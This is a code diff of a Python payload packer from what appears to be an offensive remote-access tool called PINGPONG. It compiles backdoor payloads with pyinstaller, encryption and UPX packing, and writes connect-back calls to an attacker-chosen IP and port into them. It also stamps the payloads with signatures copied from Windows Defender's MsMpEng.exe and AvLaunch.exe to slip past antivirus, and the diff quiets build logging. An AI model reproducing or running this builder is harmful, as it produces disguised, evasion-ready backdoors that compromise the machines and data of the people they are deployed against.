@@ -2,7 +2,7 @@
 # @payload  :payload packer.py
 # @Time      :2022/11/22 19:25:40
 # @Author    :D0WE1L1N
-from os import remove, mkdir, rename, system
+from os import remove, mkdir, rename, system, environ
 from os.path import isfile, isdir, abspath, dirname, sep
 from shutil import move, rmtree, copy
 from sys import path
@@ -12,7 +12,7 @@ path.append("..")
 import main, config_set
 config_list = ['Default_ip', 'Default_port', 'usage']
 #加载默认设置
-
+environ["TF_CPP_MIN_LOG_LEVEL"]='3'
 def get_mod_data(p, start_line, end_line):
 	count = 1
 	output = ''
@@ -58,7 +58,7 @@ def find_mod_location(lst, p):
 				is_find_end = True
 		line_count += 1
 	return start_list_location
-def pack(payload, printf, upx_command, file_format, is_ask=True, is_basic_payload=False, is_ask_ip='', is_ask_port=0):
+def pack(payload, printf, upx_command, file_format, is_ask=True, is_ask_ip='', is_ask_port=0, is_basic_payload=False, _payload_id='', is_return_main=True):
 	import main, config
 	if not '--upx-dir' in upx_command:
 		if upx_command != " " and upx_command != "":
@@ -117,7 +117,7 @@ def pack(payload, printf, upx_command, file_format, is_ask=True, is_basic_payloa
 		current_path = abspath(__file__)
 		father_path = abspath(dirname(current_path) + sep + ".")
 		f_father_path = abspath(dirname(father_path) + sep + ".")
-		command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} --key {key} -w"
+		command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} --key {key} -w --log-level CRITICAL"
 		command_sign_1 = f"python {father_path}/sign.py -i {father_path}/sign_sample/MsMpEng.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign.exe"
 		command_sign_2 = f"python {father_path}/sign.py -i {father_path}/sign_sample/AvLaunch.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign_twice.exe"
 
@@ -150,7 +150,7 @@ def pack(payload, printf, upx_command, file_format, is_ask=True, is_basic_payloa
 			if not is_basic_payload:
 				if isfile("payload.exe"):
 					remove("payload.exe")
-				basic_command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/_basic_conn_tmp.py {upx_command} --key {key} -w"
+				basic_command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/_basic_conn_tmp.py {upx_command} --key {key} -w --log-level CRITICAL"
 				with open('payload/_basic_conn.py', 'r') as p:
 					basic_pay = p.read()
 				with open('payload/_basic_conn_tmp.py', 'w') as a:
@@ -168,7 +168,7 @@ _connect("{ip}", {port})				''')
 				remove("./_basic_conn_tmp.spec")
 				rmtree("./build")
 				rmtree("./dist")
-				pack(payload, printf, upx_command, file_format, is_ask=False, is_basic_payload=True)
+				pack(payload, printf, upx_command, file_format, is_ask=False, is_basic_payload=True, is_ask_ip=ip, is_ask_port=port, _payload_id=_id)
 			with open("./payload/payload.py", "w+", encoding="utf8") as a:
 				a.write(f'usage_list = {open_usage}')
 				a.write(init)
@@ -212,10 +212,13 @@ PINGPONG_client("{ip}", {port})""")
 			system(command_sign_2)
 			remove(f"{father_path}/upload_payload/PINGPONG_payload_sign.exe")
 			remove(f"{father_path}/upload_payload/PINGPONG_payload.exe")
-			rename(f"{f_father_path}/payload/upload_payload/PINGPONG_payload_sign_twice.exe", f"{f_father_path}/payload/upload_payload/{payload_id}.exe")
+			rename(f"{f_father_path}/payload/upload_payload/PINGPONG_payload_sign_twice.exe", f"{f_father_path}/payload/upload_payload/{_payload_id}.exe")
 			if printf:
 				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.exe")
-				main.main()
+				if is_return_main:
+					main.main()
+				else:
+					return True
 		elif file_format == '.py':
 			with open("payload.py", "w+", encoding="utf8") as a:
 				a.write(f'usage_list = {open_usage}')
